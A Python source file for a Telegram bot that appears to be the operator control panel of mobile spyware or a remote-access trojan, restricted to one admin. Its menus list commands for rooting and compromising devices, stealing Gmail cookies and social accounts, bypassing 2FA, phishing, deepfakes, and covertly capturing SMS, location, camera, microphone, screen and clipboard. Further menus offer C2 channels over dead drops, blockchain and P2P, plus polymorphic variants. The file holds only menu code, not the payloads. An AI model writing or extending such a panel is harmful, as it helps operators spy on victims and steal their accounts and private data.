#!/usr/bin/env python3
"""
bot_commands_menu.py - Handles Telegram bot commands with a hierarchical menu system.
"""

import telebot
from telebot import types
import os
import json

class BotMenu:
    def __init__(self, bot, admin_id):
        self.bot = bot
        self.admin_id = admin_id
        self._register_handlers()

    def _register_handlers(self):
        @self.bot.message_handler(commands=['start', 'menu'])
        def show_main_menu(message):
            if message.from_user.id != self.admin_id:
                return
            markup = types.InlineKeyboardMarkup(row_width=2)
            btn1 = types.InlineKeyboardButton("🧞‍♂️ Basic", callback_data="menu_basic")
            btn2 = types.InlineKeyboardButton("☠️ Advanced", callback_data="menu_adv")
            btn3 = types.InlineKeyboardButton("☢️ Nuclear", callback_data="menu_nuke")
            btn4 = types.InlineKeyboardButton("📊 OSINT", callback_data="menu_osint")
            btn5 = types.InlineKeyboardButton("📡 C2", callback_data="menu_c2")
            btn6 = types.InlineKeyboardButton("🔬 Self Evolve", callback_data="menu_evolve")
            btn7 = types.InlineKeyboardButton("🪫 Power", callback_data="menu_power")
            btn8 = types.InlineKeyboardButton("📲 Steal", callback_data="menu_steal")
            btn9 = types.InlineKeyboardButton("🔍 Recon", callback_data="menu_recon")
            btn10 = types.InlineKeyboardButton("⚙️ Settings", callback_data="menu_settings")
            markup.add(btn1, btn2, btn3, btn4, btn5, btn6, btn7, btn8, btn9, btn10)
            self.bot.send_message(message.chat.id, "Main Menu:", reply_markup=markup)

        @self.bot.callback_query_handler(func=lambda call: call.data.startswith("menu_"))
        def handle_menu(call):
            if call.from_user.id != self.admin_id:
                return
            cmd = call.data[5:]
            markup = types.InlineKeyboardMarkup(row_width=1)
            back = types.InlineKeyboardButton("🔙 Back", callback_data="menu_main")
            if cmd == "basic":
                text = (
                    "🧞‍♂️ *Basic Commands:*\n"
                    "🔮 /basic_list – List devices\n"
                    "📇 /basic_info [id] – Device details\n"
                    "🗑️ /basic_delete [id] – Delete device\n"
                    "📨 /basic_cmd [id] [cmd] – Send command"
                )
            elif cmd == "adv":
                text = (
                    "☠️ *Advanced Attack:*\n"
                    "⚡ /adv_root [id] – Attempt root\n"
                    "📡 /adv_nearby_scan [id] – Scan nearby\n"
                    "💣 /adv_nearby_pwn [id] – Pwn nearby\n"
                    "🐳 /adv_container_escape [id] – Escape container\n"
                    "⬆️ /adv_privesc [id] – Privilege escalation"
                )
            elif cmd == "nuke":
                text = (
                    "☢️ *Nuclear Options:*\n"
                    "🍪 /nuke_gmail [id] – Steal Gmail cookies\n"
                    "👥 /nuke_social [id] – Dump social accounts\n"
                    "🔢 /nuke_2fa_force [id] – Force 2FA bypass\n"
                    "🎣 /nuke_phish [id] [url] – Smart phishing\n"
                    "🎭 /nuke_deepfake [id] – Generate deepfake"
                )
            elif cmd == "osint":
                text = (
                    "📊 *OSINT Tools:*\n"
                    "✉️ /osint_email [email] – Email lookup\n"
                    "📞 /osint_phone [number] – Phone lookup\n"
                    "👤 /osint_username [name] – Username search\n"
                    "🌐 /osint_domain [domain] – Domain recon\n"
                    "🔎 /osint_haystack [query] – Leaked data search\n"
                    "⚠️ /osint_recent_threats – Latest threats"
                )
            elif cmd == "c2":
                text = (
                    "📡 *C2 Channels:*\n"
                    "📊 /c2_status – Channel status\n"
                    "🔄 /c2_switch [channel] – Switch channel\n"
                    "📦 /c2_deaddrop_update – Update Dead Drops\n"
                    "⛓️ /c2_blockchain – Blockchain C2\n"
                    "🕸️ /c2_p2p_status – P2P status"
                )
            elif cmd == "evolve":
                text = (
                    "🔬 *Self Evolution:*\n"
                    "🦎 /evolve_polymorph – Generate polymorphic variant\n"
                    "💀 /evolve_self_destruct [id] [days] – Schedule self‑destruct\n"
                    "⬆️ /evolve_update – Update all devices\n"
                    "↩️ /evolve_rollback – Rollback to previous version"
                )
            elif cmd == "power":
                text = (
                    "🪫 *Power Management:*\n"
                    "🔋 /power_battery [id] – Battery status\n"
                    "🌙 /power_saver [id] [level] – Set power saving\n"
                    "📶 /power_wifi_only [id] – WiFi‑only mode\n"
                    "💊 /power_heal – Trigger self‑heal"
                )
            elif cmd == "steal":
                text = (
                    "📲 *Data Exfiltration:*\n"
                    "💬 /steal_sms [id] – Dump SMS\n"
                    "📍 /steal_location [id] – Get location\n"
                    "📸 /steal_photo [id] – Take photo\n"
                    "🎙️ /steal_audio [id] [sec] – Record audio\n"
                    "📺 /steal_screen [id] – Screenshot\n"
                    "📹 /steal_stream [id] – Live stream\n"
                    "📋 /steal_clipboard [id] – Clipboard grab"
                )
            elif cmd == "recon":
                text = (
                    "🔍 *Reconnaissance:*\n"
                    "🖧 /recon_network [id] – Network scan\n"
                    "🚪 /recon_ports [id] [ip] – Port scan\n"
                    "🛡️ /recon_vuln [id] – Vulnerability check\n"
                    "👁️ /recon_lidar [id] – LiDAR scan"
                )
            elif cmd == "settings":
                text = (
                    "⚙️ *Settings:*\n"
                    "🌐 /settings_lang [lang] – Change language\n"
                    "🔔 /settings_notify – Toggle notifications\n"
                    "🔑 /settings_auth – Manage access keys\n"
                    "📋 /settings_logs – View error logs"
                )
            else:
                # main menu fallback
                text = "Main Menu:"
                markup = None

            if markup:
                markup.add(back)
                self.bot.edit_message_text(
                    text,
                    call.message.chat.id,
                    call.message.message_id,
                    parse_mode='Markdown',
                    reply_markup=markup
                )
            else:
                self.bot.edit_message_text(
                    text,
                    call.message.chat.id,
                    call.message.message_id,
                    parse_mode='Markdown'
                )

        @self.bot.callback_query_handler(func=lambda call: call.data == "menu_main")
        def back_to_main(call):
            if call.from_user.id != self.admin_id:
                return
            self.bot.delete_message(call.message.chat.id, call.message.message_id)
            show_main_menu(call.message)

def setup_bot_menu(bot, admin_id):
    return BotMenu(bot, admin_id)